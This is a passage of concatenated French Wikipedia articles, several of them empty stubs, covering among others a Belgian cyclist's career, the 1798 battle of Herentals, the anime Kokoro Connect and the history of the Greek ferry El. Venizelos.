L'Onagre à sépales rouges ou Onagre de Glaziou (Oenothera glazioviana) de la famille des Onagracées. C'est une plante herbacée originaire du Brésil mais qui a été introduite ailleurs et qui s'est naturalisée dans de nombreuses régions du monde.
Sa floraison a lieu de juin à août.

</doc>
<doc id="7279800" url="https://fr.wikipedia.org/wiki?curid=7279800" title="Université Polytechnique de Palestine">
Université Polytechnique de Palestine



</doc>
<doc id="7279803" url="https://fr.wikipedia.org/wiki?curid=7279803" title="Patte de fixation">
Patte de fixation



</doc>
<doc id="7279805" url="https://fr.wikipedia.org/wiki?curid=7279805" title="Vlasek">
Vlasek



</doc>
<doc id="7279806" url="https://fr.wikipedia.org/wiki?curid=7279806" title="Wosz">
Wosz



</doc>
<doc id="7279813" url="https://fr.wikipedia.org/wiki?curid=7279813" title="AAUJ">
AAUJ



</doc>
<doc id="7279814" url="https://fr.wikipedia.org/wiki?curid=7279814" title="Pierre-Victor Braun">
Pierre-Victor Braun

Pierre-Victor Braun (Saint-Avold, - Argenteuil, ) est un prêtre français, religieux de Saint Vincent de Paul, fondateur des Servantes du Sacré-Cœur de Jésus de Versailles. Sa cause en béatification a été ouverte en France en 1991, et introduite auprès du Saint-Siège en 2007.
Biographie.
L'abbé Pierre-Victor Braun naît le , à Saint-Avold, en Lorraine germanophone. Le père Braun prend d'abord en charge les ouvriers germanophones qui cherchent du travail dans les banlieues industrieuses de Paris. Très vite, il se préoccupe aussi des jeunes filles venues chercher du travail dans la capitale. En 1866, il fonde la congrégation des Sœurs Servantes du Sacré-Cœur de Jésus en la chapelle Notre-Dame-de-Grâce de Grenelle. La petite communauté de sœurs a une règle de vie : « Qu’à tous, et de préférence aux plus démunis, soit annoncé l’Amour gratuit de Dieu ».
Pierre-Victor Braun meurt le , à Argenteuil, aujourd'hui dans le Val-d'Oise.
Il a un demi-frère Antoine-Nicolas Braun, missionnaire au Québec et fondateur des Sœurs de la charité de Québec et un de ses oncles est le grand-père de Léon-Ignace Mangin, saint et martyr.

</doc>
<doc id="7279815" url="https://fr.wikipedia.org/wiki?curid=7279815" title="VCU">
VCU



</doc>
<doc id="7279816" url="https://fr.wikipedia.org/wiki?curid=7279816" title="Musée naval de Madrid">
Musée naval de Madrid

Le musée naval de Madrid (en espagnol : "") est un musée national espagnol situé à Madrid. Ses collections sont composées d'éléments historiques de l'Armada espagnole (marine de guerre espagnole), remontant au et s'étendant jusqu'à nos jours. C'est en 1792, que le ministre de la marine suggère sa création au roi , mais ce n'est que sous le règne d', en 1843, qu'il ouvre ses portes.

</doc>
<doc id="7279817" url="https://fr.wikipedia.org/wiki?curid=7279817" title="Roccaporena">
Roccaporena



</doc>
<doc id="7279820" url="https://fr.wikipedia.org/wiki?curid=7279820" title="Stade Daugava">
Stade Daugava

Le stade Daugava (letton : Daugavas stadion) est un stade de football et d'athlétisme situé à Riga en Lettonie, construit en 1958. 
Il accueille des compétitions de football et d'athlétisme. Depuis 1992, le stade Daugava est désigné installation sportive d'importance nationale. Il appartient au gouvernement de la Lettonie.
Sa capacité est de places assises, après la destruction d'une tribune de places.

</doc>
<doc id="7279821" url="https://fr.wikipedia.org/wiki?curid=7279821" title="Andries Hendrik Potgieter">
Andries Hendrik Potgieter

Andries Hendrik Potgieter, est un chanteur sud-africain blanc issu de la communauté afrikaner.
Biographie.
Origines.
Andries Hendrik Potgieter prétend être dignement afrikaans et fier de son héritage. Il est issu d'une célèbre famille de Voortrekkers qui ont marqué l'histoire des Afrikaners et du Grand Trek : il est un descendant de la septième génération du chef boer Andries Hendrik Potgieter, qui a apporté une contribution importante à l'histoire du pays : cet ancêtre, un , a découvert les lieux qui deviendront les villages Potchefstroom et Ohrigstad et est l'un de ceux qui ont fondé des républiques boers au nord du fleuve Orange. La fierté de l'héritage familial est une constante dans l'histoire de sa famille. Si, comme beaucoup de jeunes Sud-Africains, Andries Hendrik n'avait, un jour, montré aucun intérêt pour l'histoire de sa famille, plus tard, il s'est déclaré prêt à marcher sur les traces de son ancêtre.
Engagements communautaires et culturels.
Andries-Hendrik Potgieter est un des initiateurs du projet ", visant à l'épanouissement des jeunes et des valeurs morales. Avec Nadine Blom, lauréate d'un prix de la musique de l'Afrique du Sud (South African Music Awards), et le Soweto Gospel Choir (qui a remporté des ), Andries-Hendrik a enregistré un album sorti en mars 2011 et immédiatement disponible en plus de 400 magasins de disques. Ensemble avec Waldo Greeff, Andries Hendrik a écrit une prière nationale pour la jeunesse d'Afrique du Sud. Cette chanson, chantée en anglais, afrikaans et zoulou, est le nouvel hymne de la jeunesse et est censée être jouée lors de tous les grands événements nationaux, comme la Journée de la jeunesse et les célébrations de la Journée du patrimoine. Elle sert de vaccination positiviste en ces temps difficiles où les jeunes doivent faire face à des défis quotidiens, tels que la pauvreté et le chômage, et à un avenir sombre.
Il a également été désigné comme figure de proue du projet ' du syndicat Solidariteit (Solidarité) ; ce projet vise à faire redécouvrir aux Afrikaners leurs racines et leur identité africaine dans l'ère moderne et a offert aux élèves du secondaire la possibilité de participer à un concours national d'écriture de paroles de chansons, les forçant ainsi à s'interroger sur leur origine. À Andries Hendrik a incombé la tâche de chanter la chanson thème, écrite par Waldo Greeff, ', et les autres chansons gagnantes. Huit chansons gagnantes ont été sélectionnées pour être enregistrées dans un album sorti en 2011. Le célèbre chanteur Steve Hofmeyr chante avec Andries Hendrik la chanson gagnante " ("Nous sommes l'Afrique").
Andries Hendrik est également l’artiste qui a été choisi par la Fédération des organisations culturelles afrikaans (F.A.K.) pour faire un album de vieilles chansons afrikaans bien connues. Avec Dirk van Niekerk de , Andries Hendrik a donné un nouveau look à des chansons comme "Sarie Marais" et ' ("L'Alabama arrive"). Ces chansons, et d'autres, sont réunies dans l'album ' ("Rouge ardent"), sorti en 2011.
Ancien toxicomane, producteur et trafiquant de stupéfiants et « Casanova gay », mais guéri depuis 2008, Andries Hendrik Potgieter s'est recyclé en orateur inspirant, témoignant de son retour à la foi chrétienne, de sa lutte contre la toxicomanie et de la nouvelle voie qu’a prise sa vie. En tant que chanteur chrétien en afrikaans, il parle avec des enfants et des parents des dangers de l'abus de drogues et de la façon dont on peut surmonter les obstacles les plus difficiles de la vie. Ainsi, au programme Expresso de la chaîne SABC 3, il donne un témoignage désarmant de ses expériences personnelles, y compris de l'abus sexuel dont il a été victime à l'âge de sept ans.
Début 2013, Andries Hendrik Potgieter a fêté ses fiançailles avec Sya van der Walt, une journaliste de la compagnie de radio et de télévision de la République d'Afrique du Sud. Assistée par lui et par Sya, l'écrivaine sud-africaine a écrit un livre sur la vie d'Andries Hendrik. Cette histoire d'amour, intitulée ' ("Marcheurs vers la lumière"), est publiée par une maison d'édition chrétienne, la , en 2012.

</doc>
<doc id="7279826" url="https://fr.wikipedia.org/wiki?curid=7279826" title="Daugava Stadium">
Daugava Stadium



</doc>
<doc id="7279841" url="https://fr.wikipedia.org/wiki?curid=7279841" title="L'Île aux femmes nues">
L'Île aux femmes nues

L'Île aux femmes nues est un film français de Henri Lepage sorti en 1953.
Synopsis.
Un candidat aux élections cantonales s'emploie à compromettre la carrière politique de son adversaire qui, séduit par une chanteuse, suit cette dernière dans un terrain de camping naturiste.

</doc>
<doc id="7279865" url="https://fr.wikipedia.org/wiki?curid=7279865" title="Hans Koch (écrivain)">
Hans Koch (écrivain)

Hans Koch (né le à Saint-Avold et mort le à Düsseldorf), est un médecin et écrivain allemand utilisant le nom de plume Johannes Leonhardus.
Biographie.
Hans Koch naît le à Saint-Avold, ville d'Alsace-Lorraine, annexée par l'Allemagne en 1871. En 1902, Hans Koch fonde, avec Otto Flake, René Schickele et Ernst Stadler, le mouvement littéraire expressionniste de langue allemande "Der Stürmer" et "Der Merker". Installé comme médecin à Strasbourg, il contribue régulièrement aux revues "Die Weißen Blätter" et "Die Aktion". De 1914 à 1918, il prend part à la Première Guerre mondiale, comme simple soldat. 
Après 1919, Hans Koch, expulsé par les autorités françaises en tant que citoyen d'origine allemande, s'installe à Düsseldorf, où il meurt le .
Œuvre.
L'œuvre littéraire de Hans Koch comprend des romans et des poèmes.

</doc>
<doc id="7279882" url="https://fr.wikipedia.org/wiki?curid=7279882" title="Transatlantic Trade and Investment Partnership">
Transatlantic Trade and Investment Partnership



</doc>
<doc id="7279884" url="https://fr.wikipedia.org/wiki?curid=7279884" title="Femmes dans la Grèce antique">
Femmes dans la Grèce antique



</doc>
<doc id="7279887" url="https://fr.wikipedia.org/wiki?curid=7279887" title="Espèces extrêmophiles">
Espèces extrêmophiles



</doc>
<doc id="7279889" url="https://fr.wikipedia.org/wiki?curid=7279889" title="Artillerie Spéciale">
Artillerie Spéciale



</doc>
<doc id="7279892" url="https://fr.wikipedia.org/wiki?curid=7279892" title="Rōei">
Rōei

 désigne un genre japonais de chant ou de récitation. En particulier à l'époque de Heian lors des fêtes, les "kanshi" sont chantés sur différentes mélodies avec accompagnement musical. Plus tard, les wakas sont aussi récités de cette façon.

</doc>
<doc id="7279897" url="https://fr.wikipedia.org/wiki?curid=7279897" title="Tony Beltrand">
Tony Beltrand

Tony Beltrand, pseudonyme d’Antoine Beltrand, né le à Lyon et mort le à Paris est dessinateur, graveur et illustrateur français.
Biographie.
Fils de Claude Marie Beltrand (1823-1885) et Marie Claudine Château, lyonnais, Tony Beltrand reçoit, à Paris, une formation de graveur par Guillaume Cabasson et François Pannemaker. 
Il participe une première fois au Salon de Paris en 1870, exposant trois dessins représentant les bords de la Bièvre ; il réside alors rue Hallé. Il expose de nouveau des dessins en 1872, puis, en 1878, présente cinq premières gravures sur bois d'interprétation. Il expose ensuite régulièrement au Salon des artistes français jusqu'en 1889, année où il présente une série de gravures originales et une suite gravée d'après Daniel Vigne.
Il se marie le avec Clémence Arnal (1854-1921), avec qui il a quatre fils : Jacques, Camille (1877-1951), Georges (1881-1969) et Marcel (1886-1910), qui ont tous pratiqué la gravure.
Il collabore à "L'Illustration" et au "Monde illustré", entre autres. Il s'associe à Eugène Dété (« Beltrand &amp; Dété ») pour produire de nombreuses gravures destinées aux journaux illustrés, duo rejoint par Frédéric Florian. Cet atelier qui signe par le monogramme « B.D.F », est placé sous la direction d'Auguste Lepère.
Il contribue en France à répandre le goût de la gravure sur bois en couleurs, qu'il produit en des formats originaux. Avec Auguste Lepère, il publie en 1888, le premier album de "L'Estampe originale". En 1896-1897, il est, avec Auguste Lepère et Léon Ruffe, l'administrateur de "L'Image", revue artistique et littéraire ornée de figures sur bois éditée par Henri Floury (1896-1897) pour le compte de la Corporation des graveurs sur bois.
Vers 1900, Beltrand achète 300 dessins originaux de Constantin Guys boulevard du Montparnasse auprès de l'ancienne blanchisseuse de Charles Baudelaire, à qui le poète, désargenté, les avait donnés. Gustave Geffroy et Paul Gallimard en font un ouvrage.
Tony Beltrand meurt le à la villa Brune, dans le de Paris.

</doc>
<doc id="7279899" url="https://fr.wikipedia.org/wiki?curid=7279899" title="Victor Campenaerts">
Victor Campenaerts

Victor Campenaerts, né le à Wilrijk, est un coureur cycliste belge.
Spécialiste du contre-la-montre, il devient double champion d'Europe du contre-la-montre en 2017 et 2018, il est également le détenteur du record de l'heure entre avril 2019 et août 2022, en ayant parcouru . Il compte aussi une victoire d'étape sur le Tour d'Italie 2021 et une sur le Tour de France 2024.
Biographie.
Enfance et débuts prometteurs.
Victor Campenaerts naît le à Wilrijk en Belgique. Jusqu'à ses seize ans, il pratique la natation. Après avoir essayé le triathlon où il est handicapé par des blessures liées à la course à pied&lt;ref name="vm 11/19"&gt;Vélo Magazine du novembre 2019&lt;/ref&gt;, il se consacre au cyclisme à partir de ses dix-neuf ans.
Il est en 2011 et 2012 membre de l'équipe Bianchi-Lotto-Nieuwe Hoop Tielen et se spécialise rapidement dans l'exercice du contre-la-montre.
En 2013, il est recruté par la formation Lotto-Belisol U23. Au cours de cette saison il devient champion d'Europe du contre-la-montre espoirs, champion de Belgique du contre-la-montre espoirs, et prend la huitième place au championnat du monde du contre-la-montre espoirs.
2014-2015 : Débuts chez les professionnels.
Il est recruté en 2014 par l'équipe continentale professionnelle Topsport Vlaanderen-Baloise où il effectue deux saisons et se classe notamment second du Tour de Wallonie et quatrième du Ster ZLM Toer en 2015.
À la fin de saison 2015, il signe un contrat de deux ans avec l'équipe Lotto NL-Jumbo.
2016-2019 : Double champion d'Europe du contre-la-montre et record de l'heure.
En 2016, Victor Campenaerts devient champion de Belgique du contre-la-montre et Champion de Belgique de poursuite par la suite il dispute son premier grand tour au mois d'août, à l'occasion du Tour d’Espagne. Après avoir ponctué cette première expérience en tant qu'équipier par un honorable top 5 lors du contre-la-montre de Calp, le Belge devient vice-champion d'Europe de la spécialité, à Plumelec.
En 2017, il s'offre un succès prometteur lors de l’étape contre-la-montre du Tour d'Andalousie, qu'il remporte devant Alejandro Valverde et Alberto Contador. Sa participation à la centième édition du Tour d'Italie se solde par un abandon en début de troisième semaine. Début août, il est sélectionné pour participer aux championnats d'Europe de cyclisme sur route et remporte la médaille d'or du contre-la-montre. Un mois plus tard, il perd sa place sur le podium du Tour de Grande-Bretagne au profit d'Edvald Boasson Hagen, vainqueur de la dernière étape. Le 19 septembre, durant les mondiaux, il annonce la fin de son aventure sous les couleurs de l'équipe Lotto NL-Jumbo et sa signature chez Lotto-Soudal.
En 2018, il est pour la deuxième fois champion de Belgique du contre-la-montre. Sélectionné pour représenter la Belgique aux championnats d'Europe, il conserve son titre européen du contre-la-montre. En fin de saison, il obtient la médaille de bronze du championnat du monde du contre-la-montre, une première pour un cycliste belge. Il est élu Vélo de cristal en fin de saison.
En 2019, il annonce vouloir battre le record de l'heure sur la piste d'Aguascalientes, au Mexique. Le vélodrome, situé en altitude à plus de , a déjà été le théâtre de nombreux records. En mars, pour sa seule course avant sa tentative de record, il gagne le contre-la-montre de Tirreno-Adriatico. Le 16 avril 2019, il bat le record de l'heure en parcourant 55,089 kilomètres. Il était détenu par Bradley Wiggins depuis le 7 juin 2015 avec 54,526 kilomètres parcourus, une performance réalisée sur un vélodrome situé au niveau de la mer et ne bénéficiant donc pas des avantages liés à l'altitude. Lors de la deuxième étape du Tour de Belgique, il chute dans un virage en essayant de suivre Remco Evenepoel et doit le laisser s'imposer en solitaire. Après la course, Campenaerts déclare : « Je n'avais jamais vécu cela dans ma carrière professionnelle. [...] Je ne sais pas si j'aurais pu garder sa roue, il roulait terriblement vite ». Seulement troisième du contre-la-montre le lendemain, il conclut la course en s'imposant au sein d'un groupe lors de l'avant-dernière étape. Il s'agit de sa première victoire professionnelle sur une course en ligne. Il termine finalement deuxième du général derrière Evenepoel. Annoncé comme l'un des favoris pour le championnat du monde du contre-la-montre, il est victime d'une chute, puis d'un bris de dérailleur et doit se contenter de la onzième place.
2020-2021 : Métamorphose en coureur de classique et victoire d'étape sur le Giro.
En 2020, il rejoint l'équipe NTT, avec laquelle il se concentre uniquement sur la discipline du contre-la-montre. Il termine deuxième du championnat de Belgique du contre-la-montre derrière Wout van Aert, puis se classe troisième du championnat d'Europe de cette spécialité quelques jours plus tard à Plouay dans le Morbihan. Il est battu à plusieurs reprises par Filippo Ganna sur le Tour d'Italie et sur Tirreno-Adriatico. Lors de la en ligne du Giro, c'est cette fois Josef Černý qui le devance.
Durant, l'intersaison Victor Campenaerts, ne pouvant plus rivaliser avec des coureurs comme Wout van Aert ou encore Filippo Ganna, décide de se spécialiser dans les classiques flandrienne et les étapes de grands tours.
En 2021, il remporte la étape du Tour d'Italie en devançant le Néerlandais Oscar Riesebeek au sprint en le remontant dans les derniers mètres. Lors de la deuxième journée de repos, il ressent des douleurs au genou droit ce qui l'oblige à ne pas prendre le départ de la étape.
2022-2024 : Retour chez Lotto, super combatif du Tour de France en 2023 et vainqueur d'étape en 2024.
En 2022, en raison de problèmes financiers dans son équipe, Qhubeka NextHash, Campenaerts est obligé de trouver une autre équipe. Il opte pour un retour chez Lotto-Soudal. Il obtient de bons résultats sur les classiques en finissant quatrième d'À travers les Flandres, cinquième du Circuit Het Nieuwsblad et du Tour de Belgique. En deuxième partie de saison, il gagne le Tour de Louvain-Mémorial Jef Scherens dans un sprint à deux face à Zdeněk Štybar. Il est également troisième du championnat de Belgique du contre-la-montre et du Circuit franco-belge.
En 2023, il chute lors de la Bredene Koksijde Classic. Atteint d'une fracture à une vertèbre, il abandonne la course et doit renoncer à participer au reste de la campagne des classiques. Le 10 juin, il se retrouve seul en tête de la 7e étape du Critérium du Dauphiné franchissant le premier le col de la Madeleine puis le col du Mollard avant d'être rejoint mais revêt le maillot à pois du meilleur grimpeur à l'issue de cette étape, qu'il cède lors de la dernière étape à Giulio Ciccone.En juillet, il devient le super combatif du Tour de France, après avoir été nommé 2 fois combatif d'étape à la et à la . En août, il remporte la Course des raisins au sprint face à Rasmus Tiller. En septembre, il remporte la 4 étape du Tour de Luxembourg, son premier contre la montre depuis la de Tirreno-Adriatico 2019.
Lors de la 7e étape du Tour de France 2024 disputée en contre-la-montre entre Nuits-Saint-Georges et Gevrey-Chambertin, il conserve très longtemps le meilleur temps jusqu'aux résultats des quatre premiers du classement général qui le repoussent à une remarquable cinquième place. Le 18 juillet, il remporte la à Barcelonnette dans un sprint à trois, sa première victoire sur la "Grande Boucle" à 32 ans.
En août 2024, l'équipe néerlandaise Visma Lease a Bike annonce son recrutement à partir de 2025 sur un contrat de 3 ans.
Vie privée.
En couple pendant plusieurs années avec la nageuse belge Fanny Lecluyse, il devient papa d'un petit garçon prénommé Gustaaf avec sa nouvelle compagne Nel Goerlandt en juin 2024.
Classements mondiaux et résultats sur les grands tours.
Résultats sur les grands tours.
Tour de France.
4 participations
Tour d'Italie.
5 participations
Tour d'Espagne.
4 participations

</doc>
<doc id="7279904" url="https://fr.wikipedia.org/wiki?curid=7279904" title="Kokoro Connect">
Kokoro Connect

 est une série de light novels écrite par Sadanatsu Anda avec des illustrations de Shiromizakana. La série comprend onze volumes publiés par Enterbrain entre et . Deux adaptations en mangas ont été publiés par Enterbrain et Kadokawa Shoten. Une adaptation en série télévisée d'animation de treize épisodes réalisée par Shinya Kawamo et produite par le studio Silver Link a été diffusée au Japon entre juillet et . Quatre autres épisodes ont été diffusés le .
Synopsis.
L'histoire se déroule avec cinq lycéens, Taichi, Iori, Himeko, Yoshifumi et Yui, qui sont tous membres du Club Culturel Étudiant (CCE). Un jour, ils commencent à éprouver un phénomène dans lequel ils échangent au hasard leurs corps. C'est ainsi que cela commence et ils vont par la suite devoir traverser de nombreux autres tests dont le responsable n'est autre que "Fuuzen Kazura" (litt. "Cœur des Indes" en français). Ces cinq amis sont donc confrontés à de nombreux phénomènes différents selon les caprices de cet être mystérieux qui cherche par là un moyen de distraction. Leur amitié est mise à l'épreuve tout au long de cette histoire.
Light novel.
La publication de la série de "light novel" est écrite par Sadanatsu Anda et illustrée par Yukiko Horiguchi. Le premier volume, initialement nommé , a gagné le prix spécial lors des Enterbrain Entertainment Awards. Le premier volume est alors publié le sous le titre . La parution de la série principale a pris fin le et une histoire parallèle est sortie le .
Manga.
Une adaptation en manga dessiné par Cuteg est publiée entre le et le dans le magazine en ligne "Famitsu Comic Clear". Le premier volume relié est sorti le , et cinq volumes sont sortis en . Un second manga, nommé "Kokoro Connect On Air" et basé sur l'adaptation animée, est dessiné par Na! et a été prépublié dans le magazine "Nyantype" entre et et compilé en un unique volume le par Kadokawa Shoten. Deux volumes intitulés ont été publiés par Enterbrain respectivement le et .
Anime.
Une adaptation en série télévisée d'animation a été annoncée en . Elle est produite par le studio Silver Link, réalisée par Shinya Kawamo et reprend la même distribution que pour les drama CDs. La série comporte au total dix-sept épisodes : les treize premiers ont été diffusés entre le et le , et les quatre derniers le sur AT-X. Sept DVD regroupant l'intégralité de la série sont sortis entre le et le .
Produits dérivés.
Drama CD.
Un premier drama CD intitulé est sorti le . Un second intitulé est sorti le .
Jeu vidéo.
Un visual novel nommé , développé par Banpresto et édité par Namco Bandai Games, est sorti sur PlayStation Portable le .

</doc>
<doc id="7279905" url="https://fr.wikipedia.org/wiki?curid=7279905" title="Bataille de Herentals">
Bataille de Herentals

La bataille de Herentals se déroule le pendant la guerre des Paysans. Les Français prennent la ville aux paysans insurgés.
Prélude.
Le , la ville de Turnhout est envahie par les paysans insurgés. Cependant, les Français détachent une colonne depuis la Hollande avec pour ordre de reprendre cette ville. Cette colonne, commandée par le chef de brigade Bonardi, est forte de 600 fantassins de la et de 100 cavaliers du de chasseurs à cheval, ainsi qu'une compagnie d'infanterie légère et de l'artillerie. 
Devant cette menace, les insurgés décident d'évacuer Turnhout et de gagner Herentals. se regroupent dans cette ville, menés par Stolman, Van Gansen, Meulemans, Corbeels, Van Dyck et Heylen. Cependant si les paysans sont plus nombreux, ils sont nettement moins bien entraînés et équipés que les soldats républicains français. Les insurgés préparent leur défense, des troupes sont placées en avant des portes de la ville, d'autres sont chargées de défendre les rues. Des barricades sont formées sur les routes avec des abattis d'arbres.
Déroulement.
Bonardi reprend Turnhout dans la nuit du 27 au sans rencontrer de résistance. Le 29, en fin de matinée, il est devant Herentals. À deux reprises, le commandant français envoie des parlementaires, mais les rebelles les prennent pour des éclaireurs et ouvrent le feu sur eux, certains sont blessés.
Les Français passent donc à l'assaut et pénètrent dans la rue principale, cependant ils se heurtent aux insurgés retranchés derrière les maisons et les barricades. Bonardi donne alors l'ordre à ses hommes de se replier sur les portes de la ville, puis il décide d'engager l'artillerie. Les Français canonnent ou incendient tous les bâtiments où sont retranchés les rebelles, au total sont détruites. Progressivement, les Républicains s'emparent de toute la ville. Les insurgés, vaincus, abandonnent la place par le bas-quartier et se replient sur Lichtaert et Gheel.
L'affrontement avait duré quatre heures, après la prise d'Herentals le commandant français accorde deux heures de pillages à ses hommes. Les Républicains quittent la ville dans la soirée pour se rendre à Anvers. En chemin, ils passent la nuit au village de Grobbendonk qui est pillé, les hommes du village avaient pris la fuite dans les bois mais les femmes, restées sur place, sont victimes de violences de la part des soldats.
Les pertes.
Selon les rapports républicains, les pertes des insurgés sont estimées à 300 ou 600 morts mais elles sont probablement exagérées. Dans son rapport au général Desjardin, le chef de brigade Bonardy affirme que 300 rebelles ont été tués et beaucoup d'autres blessés. Des insurgés, pris les armes à la main, sont exécutés sommairement. Selon des témoignages, plusieurs habitants de la ville sont massacrés par des soldats.
D'après l'historien Paul Verhaegen, 79 paysans ont été tués lors du combat et 15 bourgeois de la ville ont été massacrés par des soldats républicains.
Selon des témoignages, les Français emportent quatorze charrettes chargées de morts ou de blessés. Selon le rapport républicain, cinq soldats français ont été tués : .

</doc>
<doc id="7279915" url="https://fr.wikipedia.org/wiki?curid=7279915" title="Bataille de Salla">
Bataille de Salla



</doc>
<doc id="7279917" url="https://fr.wikipedia.org/wiki?curid=7279917" title="El. Venizelos">
El. Venizelos

L’El. Venizelos (en grec : , "El Venizélos") est un ferry appartenant à la compagnie grecque ANEK Lines. Commandé en 1979 par l'armateur suédois Stena Line, il est prévu pour être le troisième d'une série de quatre navires identiques construit par les chantiers Stocznia de Gdynia en Pologne. Mis sur cale en 1983 sous le nom de Stena Polonica et lancé l'année suivante, son contrat de construction sera cependant résilié par Stena Line en 1986 en raison d'un important retard pris dans les travaux de finition. Rachetée dans un premier temps par l'armateur norvégien Fred. Olsen &amp; Co. en 1988, la coque du navire est finalement revendue en 1989 à la compagnie crétoise ANEK Lines qui la fait achever en Grèce au chantier de Perama. Mis en service en juin 1992 sur les lignes entre la Grèce et l'Italie sous le nom d‘"El. Venizelos", il est à l'époque le ferry le plus imposant en Méditerranée et est encore à ce jour le plus grand sous pavillon grec. Remplacé en 2001 par des unités plus performantes sur les lignes greco-italiennes, il poursuit sa carrière en naviguant entre Le Pirée et la Crète ou sous affrètement par des exploitants divers et variés, notamment la Compagnie tunisienne de navigation ou la SNCM ou plus récemment Algérie Ferries.
Histoire.
Origines et construction.
En 1979, l'armateur suédois Stena Line signe un contrat portant sur la construction de quatre navires jumeaux avec les chantiers polonais Stocznia de Gdynia. Prévus pour être exploités sur les lignes de Stena en mer Baltique, ces car-ferries affichent des dimensions particulièrement imposantes avec une longueur de 175 mètres, un tonnage de 26 000 UMS et une apparence très massive.
Le chantier débute avec la pose de la quille du "Stena Scandinavica", premier des quatre navires, en 1980. La construction du troisième navire, baptisé "Stena Polonica" commence quant à elle le 2 juillet 1983. Après son lancement qui a lieu le 28 octobre 1984, le chantier des quatre jumeaux commence à prendre du retard, les travaux de finitions s'éternisent et en 1986, les deux premiers navires ne sont toujours pas livrés. En conséquence, Stena Line décide de résilier les contrats du troisième et du quatrième navire. Inachevé, le "Stena Polonica" est racheté en 1988 par l'armateur norvégien Fred. Olsen &amp; Co. qui le rebaptise officieusement "Bonanza". Il est alors prévu que la coque du navire soit transférée en Allemagne afin d'être complétée mais le projet ne voit cependant pas le jour. En 1989, la coque est revendue à la compagnie grecque ANEK Lines pour la somme de 16,5 millions de dollars. Acheminé jusqu'en Grèce par le remorqueur "Mærsk Blazer", il est stationné à Éleusis le 16 février 1989.
Les travaux de finition débutent au mois de novembre aux chantiers de Perama. Plusieurs modifications sont apportées au navire par rapport aux plans d'origine avec notamment une organisation légèrement différente des aménagements intérieurs, la suppression de la porte rampe avant, l'ajout d'une piscine extérieure ainsi que d'un bar-discothèque sur deux étages vraisemblablement inspiré de celui présent sur les anciens ferries japonais "Lissos" et "Lato", acquis par ANEK quelques années auparavant. Renommé dans un premier temps "Kydon II", il est finalement baptisé "El. Venizelos" en hommage à Eleftherios Venizelos, célèbre homme politique grec d'origine crétoise. Après deux ans et demi de finitions, le navire est livré à ANEK Lines au mois de juin 1992, soit près de neuf ans après le début de sa construction. L‘"El. Venizelos" est alors le plus grand car-ferry de la Méditerranée, détrônant ainsi le "Danielle Casanova" de la SNCM.
Service.
Peu de temps après sa livraison, l‘"El. Venizelos" est mis en service en juin 1992 et effectue quelques allers-retours entre Le Pirée et la Crète avant d'être transféré sur les lignes entre la Grèce et l'Italie à compter du 8 juillet. Navire amiral d'ANEK Lines, ses dimensions en font également le plus gros ferry sous pavillon grec. Affecté sur les lignes greco-italiennes pendant l'été, il dessert les lignes reliant Le Pirée et la Crète durant la basse saison.
À partir de la seconde moitié des années 1990, la concurrence sur les lignes entre la Grèce et l'Italie s'intensifie à la suite de la mise en service des flottes de navires rapides de grandes dimensions des compagnies rivales Superfast Ferries et Minoan Lines. Afin de se maintenir au niveau de ses concurrents, ANEK décide de remplacer l‘"El. Venizelos" par des unités plus rapides. Supplanté en 2001 par l‘"Hellenic Spirit", il est affrété au mois de juillet par les autorités italiennes et employé pendant une semaine comme hôtel flottant à Gênes dans le cadre du sommet du G8 de 2001.
Pour la saison estivale 2003, le navire est paré d'une livrée faisant la promotion de l'opérateur téléphonique grec Cosmote. Il conservera cette livrée jusqu'en 2005. À l'issue de la saison, il est affrété entre le 21 octobre et le 2 novembre pour une croisière autour de la mer Égée et de la mer Noire. Il escale notamment à Istanbul, Odessa, Yalta, Trabzon et Thessalonique.
À partir de l'été 2004, l‘"El. Venizelos" est affrété par la Compagnie tunisienne de navigation (CTN) qui l'utilise entre juin et septembre afin de renforcer les lignes entre la Tunisie, l'Italie et la France. Il en sera de même chaque saison d'été jusqu'en 2011.
Durant les basses saisons, le navire retourne au sein de la flotte d'ANEK Lines qui l'emploie sur ses lignes régulières mais également sur des croisières en Méditerranée comme du 27 octobre au 9 novembre où il se rend dans plusieurs villes d'Afrique du Nord telles que Port-Saïd, Alexandrie, Benghazi, Tripoli, Gabès, mais aussi à Malte. Sa croisière suivante, réalisée entre le 26 octobre et le 7 novembre 2006 l'emmènera à Palerme, Cagliari, Ajaccio, Nice, Civitavecchia et Naples. Il effectuera une dernière croisière entre le 5 et le 18 novembre 2006 et réalisera des escales en Afrique du Nord et les îles Baléares.
À compter de février 2011, l‘"El. Venizelos", à l'instar d'autres navires de la flotte d'ANEK, est utilisé pour évacuer la population libyenne en raison de la guerre civile faisant rage dans le pays. Il réalise à cet effet plusieurs voyages entre la Grèce et la Libye entre le 22 février et le 16 mars.
C'est également en 2011 que le navire achève sa dernière saison estivale sous affrètement par la CTN. La compagnie tunisienne s'apprêtant en effet à réceptionner son nouveau fleuron le "Tanit", dont la construction est sur le point de se terminer en Corée du Sud.
Désarmé à Perama, il ne reprend la mer qu'en juin 2012 entre Le Pirée et La Canée en remplacement du ferry "Lato". Il reste positionné sur cet axe jusqu'au 21 avril 2013 avant d'être affrété au mois de mai par la SNCM.
Repeint aux couleurs de la compagnie française en prévision de sa future affectation, le navire troque sa livrée fantaisiste pour une bande bleue bordant les hublots du pont 8. Il quitte Perama le 19 mai pour rejoindre Marseille.
Affrété pour une durée de quatorze mois afin de remplacer le car-ferry "Île de Beauté", l‘"El. Venizelos" est prévu pour être exploité sur les liaisons de la SNCM entre Marseille, la Tunisie et l'Algérie. Arrivé dans la cité phocéenne le 21 mai, il débute ses rotations vers le Maghreb le 25 mai. Au cours de la saison estivale, il effectue quelques traversées vers la Corse et escale à Porto-Vecchio chaque samedi.
Du 4 au 16 septembre, le car-ferry sert d’hôtel flottant dans le port de Nice afin de loger les participants des Jeux de la Francophonie.
Exploité sous pavillon grec, il était prévu que le navire soit francisé dès 2014. Toutefois, la SNCM mettra un terme à l'affrètement de l‘"El. Venizelos" le 30 septembre après seulement quatre mois d'exploitation. La compagnie a en effet été confrontée à de nombreux ennuis techniques avec le navire durant l'été, notamment concernant sa vitesse qui s'est avérée bien inférieure à celle mentionnée dans le contrat d'affrètement. De retour au Pirée le 3 octobre, l‘"El. Venizelos" est restitué à ANEK.
En janvier 2014, il est affrété pour servir d'hôtel flottant afin d'héberger les sinistrés de la ville d'Argostóli, frappée par un séisme de magnitude 6,1.
